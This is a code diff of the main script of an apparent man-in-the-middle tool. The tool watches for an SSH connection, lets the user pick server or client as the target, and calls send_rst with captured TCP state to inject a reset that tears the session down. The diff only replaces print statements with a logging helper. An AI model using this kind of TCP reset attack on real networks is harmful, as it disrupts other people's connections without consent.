@@ -1,12 +1,12 @@
 from hping import send_rst
 from monitor import NetworkMonitor
+from util import log
 
 
 def choose_target():
     print("\n========== TARGET ==========")
     print("1. Server")
     print("2. Client")
-
     while True:
         choice = input("Choose target: ").strip()
         if choice == "1":
@@ -17,26 +17,20 @@ def choose_target():
 
 
 def main():
-    print("[*] Starting MITM TCP monitor...")
-
+    log("MAIN", "starting MITM TCP monitor")
     monitor = NetworkMonitor()
     monitor.start()
 
-    print("[*] Waiting for SSH connection...")
+    log("MAIN", "waiting for SSH connection to stabilize (open a NEW ssh session now)")
     monitor.wait_for_stability()
-    print("\n[*] Connection is stable.")
+    log("MAIN", "connection stabilized")
 
     target = choose_target()
-
     try:
         state = monitor.get_state(target)
     except RuntimeError as e:
-        print(f"[!] {e}")
+        log("ERR", str(e))
         return
-
-    print("\n[+] RST state to inject:")
-    for k, v in state.items():
-        print(f"    {k}: {v}")
 
     send_rst(
         state["source_ip"],
